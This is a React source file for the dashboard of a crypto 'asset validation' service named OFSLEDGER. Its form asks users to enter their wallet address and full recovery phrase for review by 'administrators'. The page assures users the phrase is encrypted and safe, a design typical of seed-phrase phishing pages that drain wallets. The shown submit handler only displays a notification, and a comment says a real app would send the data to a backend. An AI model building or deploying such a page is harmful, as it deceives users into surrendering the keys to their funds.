
import React, { useState } from "react";
import { Link } from "react-router-dom";
import { ArrowRight, Clock, FileText, Shield, Users, Wallet, KeyRound, AlertCircle } from "lucide-react";
import AnimatedSection from "@/components/ui/AnimatedSection";
import { Button } from "@/components/ui/button";
import Navbar from "@/components/layout/Navbar";
import Footer from "@/components/layout/Footer";
import { toast } from "sonner";

const Dashboard = () => {
  // Mock data - In a real app, this would come from your backend
  const user = {
    name: "John Doe",
    email: "john.doe@example.com",
    wallets: 2,
    validationStatus: "2 Pending",
  };

  const dashboardCards = [
    {
      icon: Shield,
      title: "Asset Validation",
      description: "Validate your digital assets securely with our oracle protection system.",
      link: "#validate",
      linkText: "Start Validation",
    },
    {
      icon: Wallet,
      title: "My Wallets",
      description: "View and manage all your connected wallets and their validation status.",
      link: "/wallets",
      linkText: "Manage Wallets",
    },
    {
      icon: FileText,
      title: "Documentation",
      description: "Learn more about OFS and how to properly validate your assets.",
      link: "/documentation",
      linkText: "View Docs",
    },
    {
      icon: Clock,
      title: "Validation History",
      description: "Review the history of your asset validations and their status.",
      link: "/history",
      linkText: "View History",
    },
    {
      icon: Users,
      title: "Refer Users",
      description: "Help others secure their assets by referring them to OFSLEDGER.",
      link: "/refer",
      linkText: "Refer Now",
    },
  ];

  // States for validation form
  const [seedPhrase, setSeedPhrase] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [validationMode, setValidationMode] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // In a real application, you would send this data securely to your backend
    // For demonstration purposes, we're just showing a toast notification
    if (seedPhrase.trim().split(/\s+/).length >= 12) {
      toast.success("Validation submitted for review", {
        description: "An administrator will validate your assets soon."
      });
      
      // Reset form
      setSeedPhrase("");
      setWalletAddress("");
      setValidationMode(false);
    } else {
      toast.error("Invalid seed phrase", {
        description: "Please enter a valid 12, 18, or 24-word recovery phrase."
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-grow pt-28 pb-20 bg-gradient-to-b from-custodia-surface/30 to-white">
        <div className="container-custom">
          <AnimatedSection>
            <div className="mb-8">
              <h1 className="text-3xl font-bold mb-2">Welcome, {user.name}</h1>
              <p className="text-gray-600">Here's a summary of your asset validation status</p>
            </div>
          </AnimatedSection>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mb-12">
            <AnimatedSection delay={1}>
              <div className="custodia-card">
                <div className="mb-4">
                  <Wallet className="h-8 w-8 text-custodia" />
                </div>
                <h3 className="text-xl font-semibold mb-1">Connected Wallets</h3>
                <p className="text-3xl font-bold text-custodia">{user.wallets}</p>
                <Link to="/wallets" className="text-sm text-custodia hover:underline mt-2 inline-block">
                  Manage wallets
                </Link>
              </div>
            </AnimatedSection>

            <AnimatedSection delay={2}>
              <div className="custodia-card">
                <div className="mb-4">
                  <Shield className="h-8 w-8 text-custodia" />
                </div>
                <h3 className="text-xl font-semibold mb-1">Validation Status</h3>
                <p className="text-3xl font-bold text-custodia">{user.validationStatus}</p>
                <button 
                  onClick={() => setValidationMode(true)} 
                  className="text-sm text-custodia hover:underline mt-2 inline-block"
                >
                  Continue validation
                </button>
              </div>
            </AnimatedSection>

            <AnimatedSection delay={3}>
              <div className="custodia-card bg-custodia text-white">
                <div className="mb-4">
                  <ArrowRight className="h-8 w-8" />
                </div>
                <h3 className="text-xl font-semibold mb-1">Quick Actions</h3>
                <Button
                  variant="outline"
                  className="mt-2 bg-white text-custodia hover:bg-gray-100"
                  onClick={() => setValidationMode(true)}
                >
                  Start New Validation
                </Button>
              </div>
            </AnimatedSection>
          </div>

          {validationMode ? (
            <AnimatedSection>
              <div id="validate" className="max-w-2xl mx-auto glass p-8 rounded-2xl mb-12">
                <div className="flex items-center justify-between mb-6">
                  <div className="flex items-center gap-3 text-custodia">
                    <Shield className="h-5 w-5" />
                    <span className="font-medium">Secure Validation Process</span>
                  </div>
                  <button 
                    onClick={() => setValidationMode(false)}
                    className="text-gray-500 hover:text-gray-700"
                  >
                    ✕
                  </button>
                </div>
                
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <label htmlFor="wallet" className="block text-sm font-medium">
                      Wallet Address
                    </label>
                    <input
                      id="wallet"
                      type="text"
                      className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50"
                      placeholder="Enter your wallet address"
                      value={walletAddress}
                      onChange={(e) => setWalletAddress(e.target.value)}
                      required
                    />
                  </div>
                  
                  <div className="space-y-2">
                    <label htmlFor="seed" className="block text-sm font-medium">
                      Recovery Phrase
                    </label>
                    <textarea
                      id="seed"
                      className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50 min-h-[120px]"
                      placeholder="Enter your 12, 18, or 24-word recovery phrase separated by spaces"
                      value={seedPhrase}
                      onChange={(e) => setSeedPhrase(e.target.value)}
                      required
                    />
                    <div className="flex items-start gap-2 text-sm text-gray-600">
                      <AlertCircle className="h-4 w-4 mt-0.5 shrink-0" />
                      <p>Your recovery phrase is securely encrypted and only accessible by authorized administrators for validation purposes.</p>
                    </div>
                  </div>
                  
                  <div className="flex items-center gap-2">
                    <KeyRound className="h-5 w-5 text-custodia" />
                    <p className="text-sm font-medium text-custodia">End-to-end encrypted connection</p>
                  </div>
                  
                  <div className="pt-4">
                    <Button type="submit" className="w-full bg-custodia hover:bg-custodia/90">
                      Submit for Validation
                    </Button>
                  </div>
                </form>
              </div>
            </AnimatedSection>
          ) : (
            <>
              <AnimatedSection>
                <h2 className="text-2xl font-bold mb-6">What would you like to do?</h2>
              </AnimatedSection>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                {dashboardCards.map((card, index) => (
                  <AnimatedSection key={card.title} delay={(index % 3 + 1) as 1 | 2 | 3 | 4}>
                    <div className="custodia-card h-full flex flex-col">
                      <div className="bg-custodia/10 p-3 rounded-full w-12 h-12 flex items-center justify-center mb-4">
                        <card.icon className="h-6 w-6 text-custodia" />
                      </div>
                      <h3 className="text-xl font-semibold mb-3">{card.title}</h3>
                      <p className="text-gray-600 mb-4 flex-grow">{card.description}</p>
                      {card.title === "Asset Validation" ? (
                        <Button
                          variant="outline" 
                          className="text-custodia border-custodia hover:bg-custodia hover:text-white mt-auto w-full"
                          onClick={() => setValidationMode(true)}
                        >
                          {card.linkText}
                          <ArrowRight className="ml-2 h-4 w-4" />
                        </Button>
                      ) : (
                        <Button
                          asChild
                          variant="outline"
                          className="text-custodia border-custodia hover:bg-custodia hover:text-white mt-auto w-full"
                        >
                          <Link to={card.link}>
                            {card.linkText}
                            <ArrowRight className="ml-2 h-4 w-4" />
                          </Link>
                        </Button>
                      )}
                    </div>
                  </AnimatedSection>
                ))}
              </div>
            </>
          )}
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Dashboard;
